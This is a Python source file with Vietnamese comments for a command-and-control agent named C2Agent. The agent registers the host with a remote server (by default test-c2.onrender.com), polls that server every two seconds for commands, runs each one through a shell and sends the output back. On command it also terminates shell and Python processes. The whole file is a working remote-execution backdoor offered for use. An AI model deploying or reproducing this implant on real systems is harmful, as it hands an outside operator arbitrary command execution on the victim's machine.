import requests
import subprocess
import time
import json
import socket
import platform
import os
import signal
import psutil
import threading
from datetime import datetime

class C2Agent:
    def __init__(self, server_url):
        self.server_url = server_url.rstrip('/')
        self.agent_id = None
        self.hostname = socket.gethostname()
        self.platform = platform.platform()
        self.running_processes = {}  # Lưu trữ các process đang chạy
        self.is_running = True
        
    def register(self):
        """Đăng ký agent với C2 server"""
        try:
            response = requests.post(f'{self.server_url}/api/agent/register', 
                                   json={
                                       'hostname': self.hostname,
                                       'platform': self.platform
                                   }, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data['agent_id']
                print(f"[+] Đăng ký thành công với agent ID: {self.agent_id}")
                return True
            else:
                print(f"[-] Đăng ký thất bại: {response.text}")
                return False
                
        except Exception as e:
            print(f"[-] Lỗi khi đăng ký: {e}")
            return False
    
    def ping(self):
        """Gửi ping để duy trì kết nối"""
        try:
            response = requests.post(f'{self.server_url}/api/agent/{self.agent_id}/ping',
                                   timeout=5)
            return response.status_code == 200
        except Exception as e:
            print(f"[-] Ping failed: {e}")
            return False
    
    def poll_commands(self):
        """Lấy các lệnh chờ thực thi"""
        try:
            response = requests.get(f'{self.server_url}/api/agent/{self.agent_id}/poll',
                                  timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                return []
                
        except Exception as e:
            print(f"[-] Lỗi khi poll commands: {e}")
            return []
    
    def kill_all_processes(self):
        """Dừng tất cả các process đang chạy"""
        killed_count = 0
        
        # Dừng các process được track
        for cmd_id, process in list(self.running_processes.items()):
            try:
                if process.poll() is None:  # Process vẫn đang chạy
                    # Dừng cả process group
                    if hasattr(process, 'pid'):
                        try:
                            # Dừng process group
                            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                            time.sleep(1)
                            if process.poll() is None:
                                os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except:
                            # Fallback: dừng process đơn lẻ
                            process.terminate()
                            time.sleep(1)
                            if process.poll() is None:
                                process.kill()
                    
                    killed_count += 1
                    print(f"[+] Đã dừng process từ command {cmd_id}")
                
                del self.running_processes[cmd_id]
            except Exception as e:
                print(f"[-] Lỗi khi dừng process {cmd_id}: {e}")
        
        # Dừng các bash/sh process khác có thể chạy script
        try:
            current_pid = os.getpid()
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if proc.info['pid'] == current_pid:
                        continue
                        
                    name = proc.info['name'].lower()
                    cmdline = ' '.join(proc.info['cmdline'] or [])
                    
                    # Tìm các bash/sh process chạy script
                    if (name in ['bash', 'sh', 'zsh', 'python', 'python3'] and 
                        any(keyword in cmdline.lower() for keyword in ['run.sh', './run', 'bash', 'sh'])):
                        proc.terminate()
                        killed_count += 1
                        print(f"[+] Đã dừng process: {cmdline}")
                        
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
        except Exception as e:
            print(f"[-] Lỗi khi quét processes: {e}")
        
        return f"Đã dừng {killed_count} process(es)"
    
    def execute_command(self, command, command_id):
        """Thực thi lệnh"""
        try:
            print(f"[+] Thực thi: {command}")
            
            # Tạo process group mới để dễ quản lý
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid,  # Tạo process group mới
                bufsize=1,
                universal_newlines=True
            )
            
            # Lưu process để có thể dừng sau này
            self.running_processes[command_id] = process
            
            # Chạy trong thread riêng để không block
            def run_and_collect():
                try:
                    stdout, stderr = process.communicate(timeout=300)  # 5 phút timeout
                    
                    if process.returncode == 0:
                        self.send_result(command_id, "completed", stdout, stderr)
                    else:
                        self.send_result(command_id, "failed", stdout, stderr)
                        
                except subprocess.TimeoutExpired:
                    process.kill()
                    self.send_result(command_id, "failed", "", "Command timeout (5 phút)")
                except Exception as e:
                    self.send_result(command_id, "failed", "", str(e))
                finally:
                    # Cleanup
                    if command_id in self.running_processes:
                        del self.running_processes[command_id]
            
            thread = threading.Thread(target=run_and_collect, daemon=True)
            thread.start()
            
        except Exception as e:
            self.send_result(command_id, "failed", "", str(e))
    
    def send_result(self, command_id, status, output, error):
        """Gửi kết quả về server"""
        try:
            data = {
                'command_id': command_id,
                'status': status,
                'output': output,
                'error': error
            }
            
            response = requests.post(
                f'{self.server_url}/api/agent/{self.agent_id}/result',
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Đã gửi kết quả cho command {command_id}")
            else:
                print(f"[-] Lỗi gửi kết quả: {response.text}")
                
        except Exception as e:
            print(f"[-] Lỗi khi gửi kết quả: {e}")
    
    def run(self):
        """Main loop của agent"""
        print(f"[+] Khởi động C2 Agent")
        print(f"[+] Server: {self.server_url}")
        print(f"[+] Hostname: {self.hostname}")
        print(f"[+] Platform: {self.platform}")
        
        # Đăng ký với server
        while not self.register():
            print("[-] Thử đăng ký lại sau 5 giây...")
            time.sleep(5)
        
        ping_counter = 0
        
        while self.is_running:
            try:
                # Ping mỗi 10 lần poll
                if ping_counter % 10 == 0:
                    if not self.ping():
                        print("[-] Ping thất bại, thử kết nối lại...")
                        time.sleep(5)
                        continue
                
                ping_counter += 1
                
                # Poll commands
                commands = self.poll_commands()
                
                for cmd_data in commands:
                    command_id = cmd_data['command_id']
                    command = cmd_data['command']
                    cmd_type = cmd_data['type']
                    
                    print(f"[+] Nhận lệnh {cmd_type}: {command}")
                    
                    if cmd_type == 'kill_all':
                        # Dừng tất cả processes
                        result = self.kill_all_processes()
                        self.send_result(command_id, "completed", result, "")
                    else:
                        # Thực thi lệnh thông thường
                        self.execute_command(command, command_id)
                
                time.sleep(2)  # Poll mỗi 2 giây
                
            except KeyboardInterrupt:
                print("\n[!] Nhận Ctrl+C, đang thoát...")
                self.is_running = False
                break
            except Exception as e:
                print(f"[-] Lỗi trong main loop: {e}")
                time.sleep(5)
        
        print("[+] Agent đã thoát")

def main():
    # Đọc server URL từ environment hoặc dùng default
    server_url = os.getenv('C2_SERVER_URL', 'https://test-c2.onrender.com')
    
    if server_url == 'https://your-app.onrender.com':
        print("Cảnh báo: Đang sử dụng URL mặc định. Hãy set environment variable C2_SERVER_URL")
        print("Ví dụ: export C2_SERVER_URL=https://your-actual-app.onrender.com")
    
    agent = C2Agent(server_url)
    
    try:
        agent.run()
    except Exception as e:
        print(f"[-] Lỗi khởi động agent: {e}")

if __name__ == '__main__':
    main()